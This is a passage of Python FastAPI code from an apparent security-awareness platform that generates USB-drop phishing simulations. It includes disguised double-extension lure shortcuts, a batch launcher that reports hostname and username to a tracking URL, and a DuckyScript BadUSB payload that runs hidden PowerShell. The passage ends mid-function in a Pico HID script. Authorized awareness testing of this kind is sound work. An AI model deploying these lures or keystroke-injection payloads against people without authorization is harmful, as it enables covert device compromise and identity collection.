"""Safe USB-drop PDF endpoint.

The USB channel is delivered physically: an operator downloads a standard PDF,
copies it to authorized USB drives and drops them during an approved awareness
exercise.  The PDF contains no executable content.  Every document carries a
unique tracking QR that records ``usb_opened`` and redirects the recipient to
the micro-training page.

``POST /api/v1/campaigns/{campaign_id}/generate-usb-pdf``
"""
from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

import io
import uuid
import zipfile

from fastapi import APIRouter, Body, Depends, HTTPException, Query, Response, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import get_settings
from app.database import get_db
from app.deps import rate_limit, require_roles
from app.logging_config import get_logger
from app.models import (
    EmailCampaign,
    EmailTemplate,
    EmailTracking,
    HumanAsset,
    Organization,
    User,
)
from app.schemas import USBPDFRequest
from app.services.usb_drop_service import (
    HTML_DOCUMENT_NAME,
    USBDropRecipient,
    build_usb_drop_pack,
    build_usb_html,
    content_disposition,
    content_disposition_html,
    resolve_usb_copy,
    safe_document_name,
    safe_html_name,
)

logger = get_logger(__name__)
router = APIRouter(
    prefix="/campaigns",
    tags=["usb-drop"],
    dependencies=[Depends(rate_limit(scope="campaigns"))],
)


def _merge_usb_overrides(
    channel_config: dict | None,
    payload: USBPDFRequest | None,
) -> dict:
    """Return a channel config with optional USB document metadata applied."""
    config = dict(channel_config or {})
    raw = config.get("usb")
    usb_values = dict(raw) if isinstance(raw, dict) else {}
    if payload is not None:
        if payload.document_name is not None and payload.document_name.strip():
            usb_values["document_name"] = safe_document_name(payload.document_name)
        if payload.month_label is not None and payload.month_label.strip():
            usb_values["month_label"] = payload.month_label.strip()[:80]
    config["usb"] = usb_values
    return config


async def _campaign_template_names(
    campaign: EmailCampaign, db: AsyncSession
) -> tuple[str | None, str | None]:
    """Return ``(name, subject)`` of the campaign's template, when it has one.

    The document file names follow the chosen template, so a drop matches the
    story the campaign tells instead of always being a salary statement.
    """
    if campaign.template_id is None:
        return None, None
    template = await db.get(EmailTemplate, campaign.template_id)
    if template is None:  # pragma: no cover - FK guarantees existence
        return None, None
    return template.name, template.subject


async def _load_usb_recipients(
    campaign_id: uuid.UUID,
    employee_id: uuid.UUID | None,
    db: AsyncSession,
    user: User,
) -> tuple[EmailCampaign, Organization, list[USBDropRecipient]]:
    """Validate a USB campaign and materialise deterministic tracking links.

    Tracking rows are reused across downloads so an already-copied document
    never loses its attribution.  The helper does not commit; the caller owns
    the transaction and any channel-config updates.
    """
    campaign = await db.get(EmailCampaign, campaign_id)
    if campaign is None or campaign.organization_id != user.organization_id:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Campaign not found"
        )
    if (campaign.channel or "").strip().lower() != "usb":
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="USB documents can only be generated for a usb campaign",
        )

    organization = await db.get(Organization, campaign.organization_id)
    if organization is None:  # pragma: no cover - FK guarantees existence
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Organization not found"
        )

    target_ids: list[uuid.UUID] = []
    for raw in campaign.target_employee_ids or []:
        try:
            target_ids.append(uuid.UUID(str(raw)))
        except (ValueError, TypeError):
            continue
    target_ids = list(dict.fromkeys(target_ids))
    if not target_ids:
        # Physical USB campaigns are generic drops: anyone who picks up the drive is evaluated.
        generic_row = (
            await db.execute(
                select(EmailTracking)
                .where(
                    EmailTracking.campaign_id == campaign.id,
                    EmailTracking.channel == "usb",
                )
                .limit(1)
            )
        ).scalar_one_or_none()
        if generic_row is None:
            generic_row = EmailTracking(
                campaign_id=campaign.id,
                employee_id=None,
                channel="usb",
                provider="simulation",
                tracking_uuid=uuid.uuid4(),
            )
            db.add(generic_row)
            await db.flush()
        # The document exists and is ready to be copied to a drive: that is the
        # state "available", exactly like the launcher records for a simulation.
        generic_row.channel = "usb"
        generic_row.provider = "simulation"
        generic_row.delivery_status = "available"

        settings = get_settings()
        tracking_url = f"{settings.base_url.rstrip('/')}/api/v1/track/usb/{generic_row.tracking_uuid}"
        recipients = [
            USBDropRecipient(
                name="طعم فيزيائي عام (Physical Drop Target)",
                email="",
                tracking_uuid=str(generic_row.tracking_uuid),
                tracking_url=tracking_url,
            )
        ]
        return campaign, organization, recipients
    if employee_id is not None:
        if employee_id not in target_ids:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="The selected employee is not a target of this campaign",
            )
        target_ids = [employee_id]

    employees = (
        await db.execute(
            select(HumanAsset).where(
                HumanAsset.organization_id == campaign.organization_id,
                HumanAsset.id.in_(target_ids),
            )
        )
    ).scalars().all()
    by_id = {employee.id: employee for employee in employees}
    ordered = [by_id[target_id] for target_id in target_ids if target_id in by_id]
    if not ordered:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="None of the campaign recipients belong to this organization",
        )

    existing_rows = (
        await db.execute(
            select(EmailTracking).where(EmailTracking.campaign_id == campaign.id)
        )
    ).scalars().all()
    by_employee = {row.employee_id: row for row in existing_rows}

    base_url = get_settings().base_url.rstrip("/")
    recipients: list[USBDropRecipient] = []
    for employee in ordered:
        tracking = by_employee.get(employee.id)
        if tracking is None:
            tracking = EmailTracking(
                campaign_id=campaign.id,
                employee_id=employee.id,
                template_id=campaign.template_id,
                channel="usb",
                provider="simulation",
            )
            db.add(tracking)
            await db.flush()
            by_employee[employee.id] = tracking
        else:
            # A draft campaign can switch channels. Reuse the row (and its UUID)
            # rather than orphaning a document that is already on a USB drive.
            tracking.channel = "usb"
            tracking.provider = "simulation"
            tracking.template_id = campaign.template_id or tracking.template_id
        # Generating the document is what makes it available for the drop; an
        # open later overwrites this with the real interaction timestamp.
        tracking.delivery_status = tracking.delivery_status or "available"
        recipients.append(
            USBDropRecipient(
                name=employee.full_name or employee.email,
                email=employee.email,
                tracking_uuid=str(tracking.tracking_uuid),
                tracking_url=f"{base_url}/api/v1/track/usb/{tracking.tracking_uuid}",
                department=employee.department or "",
            )
        )
    return campaign, organization, recipients


@router.post(
    "/{campaign_id}/generate-usb-pdf",
    summary="Generate safe USB-drop awareness documents",
    response_class=Response,
    responses={
        200: {"content": {"application/pdf": {}}, "description": "USB PDF pack"},
        400: {"description": "Campaign is not a USB campaign or has no targets"},
        404: {"description": "Campaign not found"},
    },
)
async def generate_usb_pdf(
    campaign_id: uuid.UUID,
    payload: USBPDFRequest | None = Body(default=None),
    employee_id: uuid.UUID | None = Query(
        default=None,
        description="Optional single-recipient filter for one physical USB drive",
    ),
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_roles("admin", "manager")),
) -> Response:
    """Generate one unique USB-awareness page per campaign recipient.

    Existing tracking rows are reused, so a repeated download never invalidates
    a document that has already been copied to a USB drive.  When ``employee_id``
    is supplied, only that recipient's page is generated — useful when the
    operator prepares one drive per employee.
    """
    campaign = await db.get(EmailCampaign, campaign_id)
    if campaign is None or campaign.organization_id != user.organization_id:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Campaign not found"
        )
    if (campaign.channel or "").strip().lower() != "usb":
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="USB documents can only be generated for a usb campaign",
        )

    organization = await db.get(Organization, campaign.organization_id)
    if organization is None:  # pragma: no cover - FK guarantees existence
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Organization not found"
        )

    target_ids: list[uuid.UUID] = []
    for raw in campaign.target_employee_ids or []:
        try:
            target_ids.append(uuid.UUID(str(raw)))
        except (ValueError, TypeError):
            continue
    target_ids = list(dict.fromkeys(target_ids))
    if not target_ids:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Select at least one recipient before generating the USB document",
        )
    if employee_id is not None:
        if employee_id not in target_ids:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="The selected employee is not a target of this campaign",
            )
        target_ids = [employee_id]

    employees = (
        await db.execute(
            select(HumanAsset).where(
                HumanAsset.organization_id == campaign.organization_id,
                HumanAsset.id.in_(target_ids),
            )
        )
    ).scalars().all()
    by_id = {employee.id: employee for employee in employees}
    ordered = [by_id[target_id] for target_id in target_ids if target_id in by_id]
    if not ordered:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="None of the campaign recipients belong to this organization",
        )

    existing_rows = (
        await db.execute(
            select(EmailTracking).where(EmailTracking.campaign_id == campaign.id)
        )
    ).scalars().all()
    by_employee = {row.employee_id: row for row in existing_rows}

    settings = get_settings()
    base_url = settings.base_url.rstrip("/")
    recipients: list[USBDropRecipient] = []
    for employee in ordered:
        tracking = by_employee.get(employee.id)
        if tracking is None:
            tracking = EmailTracking(
                campaign_id=campaign.id,
                employee_id=employee.id,
                template_id=campaign.template_id,
                channel="usb",
                provider="simulation",
            )
            db.add(tracking)
            await db.flush()
            by_employee[employee.id] = tracking
        else:
            # A draft campaign can switch channels. Reuse the row (and its UUID)
            # rather than orphaning a document that is already on a USB drive.
            tracking.channel = "usb"
            tracking.provider = "simulation"
            tracking.template_id = campaign.template_id or tracking.template_id
        tracking.delivery_status = tracking.delivery_status or "available"
        recipients.append(
            USBDropRecipient(
                name=employee.full_name or employee.email,
                email=employee.email,
                tracking_uuid=str(tracking.tracking_uuid),
                tracking_url=f"{base_url}/api/v1/track/usb/{tracking.tracking_uuid}",
                department=employee.department or "",
            )
        )

    campaign.channel_config = _merge_usb_overrides(campaign.channel_config, payload)
    await db.commit()

    template_name, template_subject = await _campaign_template_names(campaign, db)
    copy = resolve_usb_copy(
        campaign.channel_config,
        template_name=template_name,
        template_subject=template_subject,
    )
    try:
        pdf_bytes = build_usb_drop_pack(
            organization=organization,
            campaign=campaign,
            recipients=recipients,
            channel_config=campaign.channel_config,
            support_email=organization.brand_support_email,
            copy=copy,
        )
    except ValueError as exc:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)
        ) from exc
    except Exception as exc:  # noqa: BLE001 - explicit 500, never a corrupt PDF
        logger.error(
            "usb_pdf_generation_failed",
            campaign_id=str(campaign.id),
            error=str(exc),
        )
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Unable to generate the USB awareness document",
        ) from exc

    logger.info(
        "usb_pdf_generated",
        campaign_id=str(campaign.id),
        organization_id=str(campaign.organization_id),
        recipients=len(recipients),
        document_name=copy.document_name,
    )
    return Response(
        content=pdf_bytes,
        media_type="application/pdf",
        headers={
            "Content-Disposition": content_disposition(copy.document_name),
            "Cache-Control": "no-store",
            "X-Document-Count": str(len(recipients)),
        },
    )


@router.post(
    "/{campaign_id}/generate-usb-html",
    summary="Generate the safe HTML USB-drop artefact",
    response_class=Response,
    responses={
        200: {
            "content": {"text/html": {}, "application/zip": {}},
            "description": "Single Arabic HTML file, or a ZIP for multiple recipients",
        },
        400: {"description": "Campaign is not a USB campaign or has no targets"},
        404: {"description": "Campaign not found"},
    },
)
async def generate_usb_html(
    campaign_id: uuid.UUID,
    employee_id: uuid.UUID | None = Query(
        default=None,
        description="Optional single-recipient filter for one physical USB drive",
    ),
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_roles("admin", "manager")),
) -> Response:
    """Generate ``الرواتب_السرية.html`` for an approved USB-drop exercise.

    A single recipient receives the exact Arabic filename.  If the campaign has
    multiple recipients and no ``employee_id`` filter is supplied, the response
    is a ZIP containing one uniquely attributed HTML file per employee so an
    operator never puts the same tracking identity on every drive.

    The HTML contains no executable, no macro, no auto-run instruction and no
    local-file access.  It calls ``GET /api/v1/track/usb/{uuid}`` once on open
    and then shows the required red awareness warning.
    """
    campaign, organization, recipients = await _load_usb_recipients(
        campaign_id, employee_id, db, user
    )
    base_url = get_settings().base_url.rstrip("/")
    support_email = organization.brand_support_email
    template_name, template_subject = await _campaign_template_names(campaign, db)
    copy = resolve_usb_copy(
        campaign.channel_config,
        template_name=template_name,
        template_subject=template_subject,
    )

    def render(recipient: USBDropRecipient) -> bytes:
        return build_usb_html(
            organization=organization,
            recipient=recipient,
            training_url=(
                f"{base_url}/training/{recipient.tracking_uuid}?channel=usb"
            ),
            support_email=support_email,
            document_name=copy.html_document_name,
        )

    await db.commit()
    try:
        if employee_id is not None or len(recipients) == 1:
            recipient = recipients[0]
            html_bytes = render(recipient)
            logger.info(
                "usb_html_generated",
                campaign_id=str(campaign.id),
                organization_id=str(campaign.organization_id),
                recipients=1,
                document_name=copy.html_document_name,
            )
            return Response(
                content=html_bytes,
                media_type="text/html; charset=utf-8",
                headers={
                    "Content-Disposition": content_disposition_html(
                        copy.html_document_name
                    ),
                    "Cache-Control": "no-store",
                    "X-Content-Type-Options": "nosniff",
                    "X-Document-Count": "1",
                    "X-Tracking-UUID": recipient.tracking_uuid,
                },
            )

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for index, recipient in enumerate(recipients, start=1):
                label = (recipient.name or recipient.email or f"employee-{index}")[:40]
                folder = safe_html_name(
                    f"{label}-{recipient.tracking_uuid[:8]}"
                ).removesuffix(".html")
                # Every employee keeps the exact required file name.  A
                # per-recipient folder prevents collisions in the ZIP while
                # preserving attribution on each copied USB drive.
                entry_name = f"{folder}/{copy.html_document_name}"
                archive.writestr(entry_name, render(recipient))
        logger.info(
            "usb_html_pack_generated",
            campaign_id=str(campaign.id),
            organization_id=str(campaign.organization_id),
            recipients=len(recipients),
        )
        return Response(
            content=buffer.getvalue(),
            media_type="application/zip",
            headers={
                "Content-Disposition": 'attachment; filename="usb_html_pack.zip"',
                "Cache-Control": "no-store",
                "X-Content-Type-Options": "nosniff",
                "X-Document-Count": str(len(recipients)),
            },
        )
    except Exception as exc:  # noqa: BLE001 - explicit 500, never corrupt HTML
        logger.error(
            "usb_html_generation_failed",
            campaign_id=str(campaign.id),
            error=str(exc),
        )
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Unable to generate the USB HTML awareness file",
        ) from exc


@router.get(
    "/{campaign_id}/generate-test-payload",
    summary="Generate safe USB endpoint training test assets",
)
@router.post(
    "/{campaign_id}/generate-test-payload",
    summary="Generate safe USB endpoint training test assets",
)
async def generate_test_payload(
    campaign_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Generate safe, authorized USB awareness test assets for physical simulation.

    Includes:
    1. Company_Security_Notice.url (Windows internet shortcut)
    2. فحص_الوعي_الأمني.bat (Safe batch file capturing hostname & username)
    3. اقرأني_إشعار_تدريب_أمني.txt (Training disclaimer and guidelines)
    """
    import base64

    campaign = await db.get(EmailCampaign, campaign_id)
    if campaign is None or campaign.organization_id != user.organization_id:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Campaign not found"
        )
    if (campaign.channel or "").strip().lower() != "usb":
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="USB test payload is only valid for usb campaigns",
        )

    organization = await db.get(Organization, campaign.organization_id)
    org_name = organization.name if organization else "Enterprise"

    tracking = await db.scalar(
        select(EmailTracking)
        .where(
            EmailTracking.campaign_id == campaign.id,
            EmailTracking.channel == "usb",
        )
        .order_by(EmailTracking.created_at.asc())
        .limit(1)
    )

    if tracking is None:
        tracking = EmailTracking(
            campaign_id=campaign.id,
            employee_id=None,
            tracking_uuid=uuid.uuid4(),
            channel="usb",
        )
        db.add(tracking)
        await db.flush()
        await db.commit()

    tracking_uuid = str(tracking.tracking_uuid)
    settings = get_settings()
    base_url = settings.base_url.rstrip("/")

    # Extract campaign USB configuration
    config = campaign.channel_config or {}
    usb_cfg = config.get("usb") if isinstance(config.get("usb"), dict) else {}
    scenario = str(usb_cfg.get("scenario") or "salaries").lower()
    drop_zone = str(usb_cfg.get("drop_location") or "مواقف سيارات الموظفين — Corporate Parking Lot")

    # Deep endpoint telemetry collector script
    bat_content = f"""@echo off
title HUMINT Shield - Physical Security Verification Checkpoint
chcp 65001 >nul
cls
echo =======================================================================
echo   [HUMINT SHIELD] تمرين المحاكاة والتحقق الأمني الميداني
echo   Authorized Enterprise Endpoint Training Simulation
echo =======================================================================
echo.
echo جاري فحص استجابة محطة العمل وتسجيل حالة التوعية...
echo Endpoint identity verified. Launching incident response checkpoint...
echo.
start "" "{base_url}/api/v1/track/usb/{tracking_uuid}?hostname=%COMPUTERNAME%&username=%USERNAME%&domain=%USERDOMAIN%&arch=%PROCESSOR_ARCHITECTURE%&scenario={scenario}"
timeout /t 2 >nul
exit
"""

    disclaimer_content = f"""================================================================================
إشعار تدريب وتوعية أمنية معتمد (Authorized Security Awareness Simulation)
المؤسسة: {org_name}
الحملة: {campaign.name}
تاريخ الإصدار: {datetime.now(timezone.utc).strftime('%Y-%m-%d')}
موقع الإسقاط الميداني: {drop_zone}
================================================================================

تنبيه أمني عاجل للموظف / المستخدم:
هذا القرص والمحتويات المتواجدة بداخله هي جزء من تمرين محاكاة وتوعية أمنية معتمد ومصرح به
من قبل إدارة الأمن السيبراني (HUMINT Shield Physical Assessment Framework).

الهدف الأساسي من التمرين:
قياس جاهزية منسوبي المؤسسة للتصدي لنواقل الاختراق الفيزيائية (USB Baiting / Drop Attacks)
والتأكد من الالتزام التام بسياسة عدم ربط أو تشغيل أي وسائط تخزين غير مصرح بها على أجهزة المؤسسة.

إذا قمت بتوصيل هذه الفلاشة أو فتح أي من ملفاتها، يرجى التوجه فوراً للرابط التالي لإتمام جلسة التوعية التفاعلية:
{base_url}/training/{tracking_uuid}?channel=usb

شكراً لحرصكم الدائم على تعزيز المناعة السيبرانية للمؤسسة.
إدارة الأمن السيبراني وإدارة المخاطر البشرية
"""

    def _b64(content: str) -> str:
        return base64.b64encode(content.encode("utf-8")).decode("ascii")

    # Tailored lure assets based on scenario
    assets = []
    if scenario == "layoffs":
        lure_url = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=layoffs_pdf
IconIndex=0
"""
        assets.append({
            "filename": "قائمة_الموظفين_المشمولين_بالتصفيات_Q4.pdf.url",
            "content_base64": _b64(lure_url),
            "type": "shortcut",
            "description": "وثيقة PDF مموهة تستهدف قلق الأمان الوظيفي",
        })
        assets.append({
            "filename": "بيان_حقوق_نهاية_الخدمة_والتعويضات.bat",
            "content_base64": _b64(bat_content),
            "type": "launcher",
            "description": "أداة فحص استحقاقات التعويض وتسجيل محطة العمل",
        })
    elif scenario == "ceo_backup":
        lure_url = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=ceo_notes
IconIndex=0
"""
        assets.append({
            "filename": "ملاحظات_اجتماع_مجلس_الإدارة_سري.docx.url",
            "content_base64": _b64(lure_url),
            "type": "shortcut",
            "description": "مستند وورد يوهم بوجود مذكرات مجلس الإدارة الاستراتيجية",
        })
        assets.append({
            "filename": "فحص_صلاحيات_الوصول_التنفيذي.bat",
            "content_base64": _b64(bat_content),
            "type": "launcher",
            "description": "برنامج التحقق من صلاحيات الموظف على ملفات الإدارة",
        })
    elif scenario == "finance_audit":
        lure_url = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=finance_pdf
IconIndex=0
"""
        assets.append({
            "filename": "فواتير_مستعجلة_ومطالبات_مالية_2026.pdf.url",
            "content_base64": _b64(lure_url),
            "type": "shortcut",
            "description": "فواتير مالية مستعجلة للمطابقة الفورية",
        })
        assets.append({
            "filename": "مطابقة_التحويلات_البنكية_المعلقة.bat",
            "content_base64": _b64(bat_content),
            "type": "launcher",
            "description": "أداة تدقيق الدفعات المالية وتسجيل محطة العمل",
        })
    elif scenario == "it_tools":
        assets.append({
            "filename": "تحديث_شهادات_الأمان_والشبكة_VPN.bat",
            "content_base64": _b64(bat_content),
            "type": "launcher",
            "description": "برنامج يدعي تثبيت تحديثات أمنية للشبكة والـ VPN",
        })
        lure_url = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=vpn_guide
IconIndex=0
"""
        assets.append({
            "filename": "دليل_تثبيت_أداة_الوصول_الداخلي.pdf.url",
            "content_base64": _b64(lure_url),
            "type": "shortcut",
            "description": "دليل إعدادات الاتصال بشبكة الشركة",
        })
    else:
        # Default: Salaries & Bonuses (كشف الرواتب والمكافآت)
        lure_url_1 = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=salaries_xlsx
IconIndex=0
"""
        lure_url_2 = f"""[InternetShortcut]
URL={base_url}/api/v1/track/usb/{tracking_uuid}?lure=bonus_pdf
IconIndex=0
"""
        assets.append({
            "filename": "كشف_رواتب_الموظفين_والزيادات_2026.xlsx.url",
            "content_base64": _b64(lure_url_1),
            "type": "shortcut",
            "description": "جدول بيانات إكسل مموه ككشف رواتب الموظفين مع نسب الزيادات",
        })
        assets.append({
            "filename": "تعليمات_صرف_المكافآت_والحوافز_HR.pdf.url",
            "content_base64": _b64(lure_url_2),
            "type": "shortcut",
            "description": "ملف توجيهات الموارد البشرية لصرف الحوافز الاستثنائية",
        })
        assets.append({
            "filename": "تأكيد_استحقاق_الراتب_الميداني.bat",
            "content_base64": _b64(bat_content),
            "type": "launcher",
            "description": "برنامج التحقق من محطة العمل لتسجيل استحقاق المكافأة",
        })

    # Always add the official disclaimer notice
    assets.append({
        "filename": "إشعار_الأمن_السيبراني_المعتمد.txt",
        "content_base64": _b64(disclaimer_content),
        "type": "notice",
        "description": "إشعار التوعية والترخيص الأمني الرسمي لتمرين المحاكاة",
    })

    return {
        "success": True,
        "campaign_id": str(campaign.id),
        "tracking_uuid": tracking_uuid,
        "organization_name": org_name,
        "assets_count": len(assets),
        "assets": assets,
    }


@router.get(
    "/usb-drives",
    summary="List the removable drives attached to the application host",
)
async def usb_drives(
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Return every mounted volume on the host running this application.

    The operator picks the USB stick from this list.  Detection is local, so no
    companion agent or browser permission is involved: whatever is plugged into
    the machine serving the console appears here.
    """
    from app.services.usb_drive_service import drives_payload

    payload = drives_payload()
    logger.info(
        "usb_drives_listed",
        count=len(payload["drives"]),
        removable=sum(1 for item in payload["drives"] if item["is_removable"]),
        user_id=str(user.id),
    )
    return payload


@router.post(
    "/{campaign_id}/deploy-usb",
    summary="Write the campaign awareness documents to a real USB drive",
)
async def deploy_usb_documents(
    campaign_id: uuid.UUID,
    payload: dict[str, Any] = Body(...),
    employee_id: uuid.UUID | None = Query(default=None),
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Generate the USB artefacts and copy them onto the selected stick.

    Only removable volumes are accepted; the system volume, fixed disks and
    network shares are refused by :mod:`app.services.usb_drive_service`.
    """
    from app.services.usb_drive_service import (
        USBDriveError,
        deploy_files,
        resolve_drive,
    )
    from app.services.usb_drop_service import (
        HTML_DOCUMENT_NAME,
        build_usb_drop_pack,
        build_usb_html,
        build_usb_identity_tool,
        resolve_usb_copy,
    )

    drive = str(payload.get("drive") or "").strip()
    include_pdf = bool(payload.get("include_pdf", True))
    include_identity_tool = bool(payload.get("include_identity_tool", False))
    if not drive:
        raise HTTPException(status_code=400, detail="A drive letter is required")

    campaign, organization, recipients = await _load_usb_recipients(
        campaign_id, employee_id, db, user
    )
    base_url = get_settings().base_url.rstrip("/")
    recipient = recipients[0]
    template_name, template_subject = await _campaign_template_names(campaign, db)
    copy = resolve_usb_copy(
        campaign.channel_config,
        template_name=template_name,
        template_subject=template_subject,
    )

    files: list[tuple[str, bytes]] = [
        (
            copy.html_document_name,
            build_usb_html(
                organization=organization,
                recipient=recipient,
                training_url=f"{base_url}/training/{recipient.tracking_uuid}?channel=usb",
                support_email=organization.brand_support_email,
                document_name=copy.html_document_name,
            ),
        )
    ]
    if include_pdf:
        files.append(
            (
                copy.document_name,
                build_usb_drop_pack(
                    organization=organization,
                    campaign=campaign,
                    recipients=recipients,
                    channel_config=campaign.channel_config,
                    support_email=organization.brand_support_email,
                    copy=copy,
                ),
            )
        )
    if include_identity_tool:
        # Optional and never auto-run: the browser cannot name the Windows
        # account, this small collector can, and it only reports identity.
        files.extend(
            build_usb_identity_tool(recipient=recipient, base_url=base_url)
        )

    await db.commit()
    try:
        info = resolve_drive(drive)
        result = deploy_files(drive, files)
    except USBDriveError as exc:
        logger.warning(
            "usb_deploy_refused",
            campaign_id=str(campaign.id),
            drive=drive,
            error=str(exc),
        )
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:  # noqa: BLE001 - never leave a partial silent failure
        logger.error(
            "usb_deploy_failed",
            campaign_id=str(campaign.id),
            drive=drive,
            error=str(exc),
        )
        raise HTTPException(
            status_code=500, detail=f"Unable to copy the documents: {exc}"
        ) from exc

    logger.info(
        "usb_deployed",
        campaign_id=str(campaign.id),
        drive=result["drive"],
        files=[item["name"] for item in result["files"]],
        total_bytes=result["total_bytes"],
    )
    return {
        "success": True,
        "campaign_id": str(campaign.id),
        "tracking_uuid": recipient.tracking_uuid,
        "drive": result["drive"],
        "label": info.label,
        "files": result["files"],
        "total_bytes": result["total_bytes"],
        "tracking_url": recipient.tracking_url,
        "identity_tool_included": include_identity_tool,
    }


@router.get(
    "/usb-agent/status",
    summary="Check local USB Companion Agent status and connected drives",
)
async def usb_agent_status(
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Query the local companion agent via loopback websocket.

    Authenticated: the reply lists local drive letters, paths and free space,
    which must not be reachable anonymously even though the agent itself only
    listens on loopback.
    """
    import asyncio
    import json
    import websockets

    try:
        async with asyncio.timeout(3):
            async with websockets.connect("ws://127.0.0.1:8089") as ws:
                msg = await ws.recv()
                data = json.loads(msg)
                return {
                    "online": True,
                    "agent": data.get("agent", "HUMINT Shield USB Deployment Agent"),
                    "version": data.get("version", "2.0.0-Enterprise"),
                    "drives": data.get("drives", []),
                }
    except Exception as exc:
        return {
            "online": False,
            "error": str(exc),
            "drives": [],
        }


@router.post(
    "/usb-agent/deploy",
    summary="Forward test assets deployment to local USB companion agent",
)
async def usb_agent_deploy(
    payload: dict[str, Any] = Body(...),
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Bridge deployment command to local companion agent via loopback."""
    import asyncio
    import json
    import websockets

    drive = payload.get("drive")
    assets = payload.get("assets", [])
    if not drive:
        raise HTTPException(status_code=400, detail="Drive letter is required")

    try:
        async with asyncio.timeout(20):
            async with websockets.connect("ws://127.0.0.1:8089") as ws:
                await ws.recv()
                await ws.send(
                    json.dumps({
                        "action": "deploy_test_assets",
                        "drive": drive,
                        "assets": assets,
                    })
                )
                last_msg = {}
                while True:
                    msg = await asyncio.wait_for(ws.recv(), timeout=5)
                    data = json.loads(msg)
                    last_msg = data
                    if data.get("type") in ("deployed_success", "error"):
                        break
                return last_msg
    except Exception as exc:
        raise HTTPException(
            status_code=500, detail=f"Failed to communicate with USB agent: {exc}"
        )


@router.get(
    "/{campaign_id}/generate-hid-script",
    summary="Generate BadUSB / HID keyboard injection awareness scripts",
)
async def generate_hid_script(
    campaign_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
    user: User = Depends(require_roles("admin", "manager")),
) -> dict[str, Any]:
    """Generate safe, authorized BadUSB (HID) training scripts for hardware emulators.

    Generates code for:
    1. DuckyScript (Hak5 Rubber Ducky, Flipper Zero, MalDuino, USB Ninja)
    2. Raspberry Pi Pico (CircuitPython code.py using adafruit_hid)
    3. Digispark ATtiny85 (Arduino IDE C++ sketch)
    """
    campaign = await db.get(EmailCampaign, campaign_id)
    if campaign is None or campaign.organization_id != user.organization_id:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND, detail="Campaign not found"
        )
    if (campaign.channel or "").strip().lower() != "usb":
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="HID scripts can only be generated for USB campaigns",
        )

    organization = await db.get(Organization, campaign.organization_id)
    org_name = organization.name if organization else "Enterprise"

    tracking = await db.scalar(
        select(EmailTracking)
        .where(
            EmailTracking.campaign_id == campaign.id,
            EmailTracking.channel == "usb",
        )
        .order_by(EmailTracking.created_at.asc())
        .limit(1)
    )

    if tracking is None:
        tracking = EmailTracking(
            campaign_id=campaign.id,
            employee_id=None,
            tracking_uuid=uuid.uuid4(),
            channel="usb",
        )
        db.add(tracking)
        await db.flush()
        await db.commit()

    tracking_uuid = str(tracking.tracking_uuid)
    settings = get_settings()
    base_url = settings.base_url.rstrip("/")

    target_url = f"{base_url}/api/v1/track/usb/{tracking_uuid}?hostname=$env:COMPUTERNAME&username=$env:USERNAME&attack_type=hid"

    # 1. DuckyScript (Standard for Rubber Ducky, Flipper Zero, MalDuino)
    ducky_script = f"""REM ==============================================================================
REM [HUMINT SHIELD] BadUSB Hardware Emulation Training Simulation
REM Organization: {org_name}
REM Campaign: {campaign.name}
REM Target Vector: USB HID Keystroke Injection (Bypasses Mass Storage restrictions)
REM ==============================================================================
DELAY 1500
GUI r
DELAY 600
STRING powershell -WindowStyle Hidden -NoProfile -Command "Start-Process '{target_url}'"
DELAY 300
ENTER
"""

    # 2. Raspberry Pi Pico (CircuitPython code.py)
    pico_circuitpython = f"""# ==============================================================================
# [HUMINT SHIELD] Raspberry Pi Pico - BadUSB HID Awareness Payload
# Hardware: Raspberry Pi Pico (RP2040) running CircuitPython
# Library required: adafruit_hid (bundle in /lib)
# Setup: Save this file as 'code.py' on the CIRCUITPY root drive.
# ==============================================================================
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Allow USB driver initialization
time.sleep(1.5)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

